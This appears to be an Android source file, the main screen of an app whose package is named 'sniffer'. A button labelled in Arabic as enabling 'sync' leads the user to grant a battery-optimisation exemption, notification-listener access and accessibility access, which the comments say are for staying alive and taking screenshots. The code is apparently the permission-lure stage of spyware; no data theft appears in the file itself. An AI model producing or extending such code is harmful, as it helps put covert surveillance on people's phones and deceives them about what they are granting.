package com.v8.global.sniffer;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF121212);

        Button btn = new Button(this);
        btn.setText("تفعيل المزامنة والبدء");
        btn.setOnClickListener(v -> {
            // 1. استثناء البطارية (للبقاء حياً)
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);

            // 2. صلاحية الإشعارات
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

            // 3. صلاحية الوصول (للسكرين شوت)
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });

        layout.addView(btn);
        setContentView(layout);
    }
}
